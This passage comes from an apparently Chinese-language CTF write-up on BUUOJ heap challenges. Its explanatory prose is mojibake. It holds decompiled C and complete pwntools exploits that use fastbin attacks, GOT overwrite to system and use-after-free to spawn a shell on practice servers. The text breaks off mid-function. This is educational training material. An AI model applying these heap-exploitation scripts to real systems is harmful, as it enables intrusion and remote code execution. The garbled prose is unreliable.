<span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">0x1305</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æœ‰ä¸€ä¸ªåé—¨å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">l33t</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºå’Œåˆ é™¤å †éƒ½æ˜¯æ­£å¸¸çš„ åªæœ‰ç¼–è¾‘å †å’Œä¸Šä¸€ä¸ªå †é¢˜ä¸€æ ·å­˜åœ¨Use after freeçš„å †æº¢å‡º è¿™é‡Œä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯é€‰æ‹©åœ¨å…¨å±€å˜é‡<code>magic</code>å‰é¢æŸå¤„ä¸ºfkfdç„¶åè¦†ç›–æ‰ä¸€ä¸ªunsortedbinä¸­çš„chunkçš„fdè¿™æ ·åœ¨ä¸‹æ¬¡ç”³è¯·ä¸€ä¸ªsize &gt;&#x3D; 0x80çš„chunkæ—¶å°±å¯ä»¥ç¼–è¾‘<code>magic</code> å‘ç°è¿™æ ·åšåªåä¸ç”¨ç¼–è¾‘<code>magic</code>å®ƒä¹Ÿä¼šè¢«ç”³è¯·çš„chunkä¸­çš„fdå’Œbkç»™è¦†ç›–ä»è€Œå¯ä»¥æ‰§è¡Œåé—¨å‡½æ•° ä½†æ˜¯æ‰§è¡Œåä¼šå‘ç°flagä¸åœ¨é‚£ä¸ªç›®å½•ä¸‹</p>
<p>å›æƒ³èµ·gotè¡¨å¯å†™ åˆæœ‰äº†è¿™æ ·çš„æ€è·¯: å°†gotè¡¨é‡Œçš„<code>free</code>è¦†ç›–æˆåé—¨æä¾›çš„<code>system</code>å‡½æ•° æ‰§è¡Œ<code>free</code>æ—¶å°±ä¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ å°†è¦é‡Šæ”¾çš„å †å—å†…å®¹ç¼–è¾‘ä¸º<code>/bin/sh</code>å°±èƒ½get shell è¿™é‡Œä¸ºäº†æ–¹ä¾¿å†™å…¥å¯ä»¥å…ˆåˆ©ç”¨fastbin attackè¿›è¡Œä»»æ„å†…å­˜è¯»å†™è¦†ç›–é¢˜ç›®ä¸­å­˜æ”¾ç”³è¯·åˆ°çš„å †å—çš„<code>heaparray</code>æ•°ç»„ ç„¶åç›´æ¥ç”¨ç¼–è¾‘å‡½æ•°æ¥è¿›è¡Œä»»æ„å†…å­˜è¯»å†™ gdbä¸€ä¸‹å‘ç°<code>heaparray</code>ä¸Šä¸è¿œå¤„å°±æœ‰èƒ½å¤Ÿç”³è¯·fastbinçš„ä½ç½®:<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F28%2F20241028-143737.png" alt="image-20241028143737187"></p>
<p>ç”¨ä¸Šä¸€é¢˜çš„æ€è·¯å°±èƒ½å°†<code>system</code>å†™å…¥gotè¡¨ä¸­çš„<code>free</code>äº† åšè¿™é¢˜å‘ç°äº†fastbinç”³è¯·çš„å¦ä¸€ä¸ªé™åˆ¶ å³è¦ç”³è¯·çš„åœ°å€å¯¹åº”çš„headerä¸­sizeå­—æ®µè¦ç¬¦åˆç”³è¯·çš„å¤§å° è¿™é‡Œ<code>0x7f</code>å°±è¦å¯¹åº”0x60 ä¸ç„¶ä¼šç”³è¯·å¤±è´¥:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">so = ELF(<span class="string">&#x27;/oldlibcs/ubt16/64.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">26230</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 20000)</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fkfd = <span class="number">0x6020AD</span></span><br><span class="line">magic = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Heap : &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Heap : &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;heap : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    <span class="comment"># print(p.recvuntil(b&#x27;Done !&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create_heap(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">delete_heap(<span class="number">1</span>)          <span class="comment"># 1</span></span><br><span class="line">delete_heap(<span class="number">2</span>)          <span class="comment"># 2</span></span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fkfd))</span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x60</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">edit_heap(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(free_got))</span><br><span class="line">edit_heap(<span class="number">0</span>, p64(system_plt))</span><br><span class="line">edit_heap(<span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_heap(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="hitcontraining-uaf-Use-after-free"><a href="#hitcontraining-uaf-Use-after-free" class="headerlink" title="hitcontraining_uaf | Use after free"></a>hitcontraining_uaf | Use after free</h2><p>å’Œä¹‹å‰çš„ä¸¤é“å †é¢˜ä¸€æ ·æ˜¯Use after free ä½†æ˜¯å‰é¢åˆ©ç”¨çš„éƒ½æ˜¯Off-By-Oneæ ˆæº¢å‡º è¿™é¢˜æœ‰ç‚¹ä¸ä¸€æ · æ‰€ä»¥è®°å½•ä¸€ä¸‹</p>
<p>ä¸»è¦å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_DWORD **<span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (_DWORD **)((<span class="type">int</span> (__cdecl *)(_DWORD **))*(&amp;notelist)[v2])((&amp;notelist)[v2]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_DWORD **<span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2][<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2]);</span><br><span class="line">    <span class="keyword">return</span> (_DWORD **)<span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_DWORD **<span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD **result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD **v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = (_DWORD **)count;</span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">return</span> (_DWORD **)<span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (&amp;notelist)[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      (&amp;notelist)[i] = (_DWORD **)<span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;notelist)[i] = print_note_content;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = (&amp;notelist)[i];</span><br><span class="line">      v1[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (&amp;notelist)[i][<span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> (_DWORD **)++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­˜æ”¾å †çš„ç»“æ„å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">notelist--&gt;heap0--&gt;print_function_addr</span><br><span class="line">            .	|_&gt;malloced_heap</span><br><span class="line">            .</span><br><span class="line">            .</span><br></pre></td></tr></table></figure>

<p>ç”¨äºŒçº§æŒ‡é’ˆ ä¸€çº§æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ª<code>content[2]</code> å…¶ä¸­<code>content[0]</code>æ˜¯ä¸€ä¸ªè¾“å‡ºå‡½æ•°çš„åœ°å€ æ¯ä¸ªç”³è¯·çš„å †éƒ½ä¼šå­˜æ”¾è¿™ä¸ªå‡½æ•°åœ°å€ <code>content[1]</code>å°±æ˜¯çœŸæ­£ç”³è¯·åˆ°çš„å † è¦è¯»å–å †çš„æ•°æ®æ—¶å°±è°ƒç”¨<code>content[0]</code> ç”¨æˆ·é‡Šæ”¾å †æ—¶å…ˆé‡Šæ”¾<code>content[1]</code>å†é‡Šæ”¾<code>content</code></p>
<p>è¿™é¢˜çš„ä¸€ä¸ªé‡ç‚¹æ˜¯<code>content</code>ä¹Ÿæ˜¯<code>malloc(8)</code>ç”³è¯·å‡ºæ¥çš„(32ä½ç¨‹åºä¸€ä¸ªåœ°å€4å­—èŠ‚) è¿™é¢˜æ²¡æœ‰ç¼–è¾‘å‡½æ•° åˆ›å»ºæ—¶æ ¹æ®è¦ç”³è¯·çš„sizeæ¥è¯»å…¥æ•°æ®</p>
<p>å› ä¸ºè¿™é¢˜ç»™äº†åé—¨å‡½æ•° æ‰€ä»¥å®é™…ä¸Šæˆ‘å¹¶æ²¡æœ‰åˆ©ç”¨åˆ° uaf(ä¸çŸ¥é“å“ªé‡Œå­˜åœ¨uaf) è¿™é‡Œåˆ©ç”¨çš„ç‚¹å°±æ˜¯ç”¨æˆ·ç”³è¯·ä¸€ä¸ªå †çš„åŒæ—¶ä¼šå…ˆç”³è¯·8bytesçš„chunk å¦‚æœç”¨æˆ·ç”³è¯·çš„å°±æ˜¯8bytesçš„chunk é‚£ä¹ˆæ ¹æ®Fastbinåˆ†é…chunkçš„è§„åˆ™ å¦‚æœä¹‹å‰é‡Šæ”¾è¿‡chunk(å¤§å°ä¸æ˜¯8bytes) Fastbinä¸­å°±ä¼šåŠ å…¥è¢«é‡Šæ”¾çš„<code>content</code> æ­¤æ—¶ç”¨æˆ·æœ‰å¯èƒ½ä¼šç”³è¯·åˆ°æŒ‡å‘<code>content[0]</code>çš„å † å¹¶ä¸”å¯ä»¥è¦†ç›–å…¶ä¸­çš„<code>print_note_content</code> è€Œç¨‹åºåœ¨é‡Šæ”¾å †æ—¶æ²¡æœ‰å°†æŒ‡å‘<code>content[0]</code>çš„æŒ‡é’ˆç½®é›¶ è°ƒç”¨æ‰“å°å‡½æ•°æ—¶ä¹Ÿä¸ä¼šæ£€æµ‹æ˜¯å¦æ˜¯å·²è¢«é‡Šæ”¾çš„å † æ‰€ä»¥åªéœ€è¦é‡Šæ”¾ä¸¤ä¸ªé8byteså¤§å°çš„chunk(ä¾‹å¦‚chunk0, chunk1) ç„¶åç”³è¯·ä¸€ä¸ªå¤§å°ä¸º8bytesçš„chunk2 è¿™æ—¶å€™æ ¹æ®Fastbinçš„åˆ†é…åŸåˆ™ä¼šå°†chunk1çš„<code>content</code>åˆ†é…ç»™chunk2çš„<code>content</code> å°†chunk0çš„<code>content</code>åˆ†é…ç»™chunk2çš„<code>content[1]</code> è¿™æ—¶å€™ç»™chunk2çš„å†…å®¹åˆå§‹åŒ–ä¸ºåé—¨å‡½æ•°å†è°ƒç”¨readnoteçš„å‡½æ•°è¯»å–chunk0å°±ä¼šè§¦å‘åé—¨ exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">vlun = p32(elf.symbols[<span class="string">&#x27;magic&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, xxxxx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">ind</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(ind).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">content</span>):</span><br><span class="line">    size = <span class="built_in">len</span>(content)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_note</span>(<span class="params">ind</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(ind).encode())</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">b&#x27;0&#x27;</span> * <span class="number">0x20</span>)   <span class="comment">#0</span></span><br><span class="line">add_note(<span class="string">b&#x27;1&#x27;</span> * <span class="number">0x20</span>)   <span class="comment">#1</span></span><br><span class="line">add_note(<span class="string">b&#x27;2&#x27;</span> * <span class="number">0x20</span>)   <span class="comment">#2</span></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line">add_note(vlun)          <span class="comment">#3</span></span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-hitcontraining-heapcreator-Off-By-One"><a href="#BUUOJ-hitcontraining-heapcreator-Off-By-One" class="headerlink" title="BUUOJ-hitcontraining_heapcreator | Off-By-One"></a>BUUOJ-hitcontraining_heapcreator | Off-By-One</h2><p>å’Œä¹‹å‰çš„<code>hitcon training</code>å·®ä¸å¤š æ ¹æ®ä¹‹å‰ç”¨æ¥å­˜æ”¾ç”³è¯·åˆ°çš„chunksçš„è‡ªå®šä¹‰ç»“æ„å…ˆå®šä¹‰ä¸€ä¸ªç»“æ„ä½“ ä¹‹åçœ‹ä»£ç ä¼šæ–¹ä¾¿å¾ˆå¤š:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F11%2F26%2F20241126-173317.png" alt="image-20241126173310767"></p>
<p> ç¨‹åºæ•´ä½“å°±æ˜¯åœ¨é‚£ä¸ªç¨‹åºä¸Šä¿®æ”¹äº†å‡ å¤„é€»è¾‘ä½¿å¾—æ— æ³•åˆ©ç”¨ä¹‹å‰çš„æ¼æ´ æ‰€ä»¥åªä»‹ç»æ›´æ”¹çš„åœ°æ–¹</p>
<h3 id="é‡Šæ”¾å †"><a href="#é‡Šæ”¾å †" class="headerlink" title="é‡Šæ”¾å †"></a>é‡Šæ”¾å †</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((*(&amp;heaparray + v1))-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†é‡Šæ”¾åçš„å †æŒ‡é’ˆç½®é›¶ ä¿®å¤äº†uafçš„æ¼æ´</p>
<h3 id="ä¿®æ”¹å †"><a href="#ä¿®æ”¹å †" class="headerlink" title="ä¿®æ”¹å †"></a>ä¿®æ”¹å †</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of 